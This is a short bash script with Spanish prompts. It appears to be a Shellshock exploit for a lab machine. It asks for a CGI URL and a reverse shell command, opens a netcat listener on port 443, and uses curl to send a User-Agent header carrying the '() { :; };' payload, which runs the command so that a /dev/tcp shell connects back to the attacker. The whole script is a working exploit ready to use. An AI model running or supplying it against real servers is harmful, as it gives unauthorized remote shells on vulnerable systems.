read -p "Introduzca su url con el binario cgi (EXAMPLE: http://10.10.10.56/cgi-bin/user.sh): " url
read -p "Introduzca el comando para entablar una Reverse Shell (EXAMPLE: bash >& /dev/tcp/x.x.x.x/443 0>&1): " comando

x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &
disown %; wait
curl -H "User-Agent: () { :; }; /bin/$comando" $url
